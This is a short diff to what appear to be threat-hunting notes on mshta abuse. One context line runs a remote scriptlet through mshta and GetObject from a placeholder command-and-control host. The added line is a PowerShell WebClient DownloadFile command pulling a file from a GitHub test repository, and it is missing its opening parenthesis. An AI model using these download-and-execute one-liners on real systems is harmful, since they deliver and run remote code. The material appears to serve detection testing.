@@ -23,3 +23,5 @@ Note: this syntax only works in cmd but will give an error if executed in PowerS
 Example 3: Calling a public method named Exec in a com scriptlet with JavaScript:
 
    mshta javascript:a=GetObject(“script:http://c2[.]com/cmd.sct”).Exec()
+
+New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/0xMo/TestThreatHunting/main/createHTA.text", "C:\Users\m1998\Desktop\testDonwload.txt")
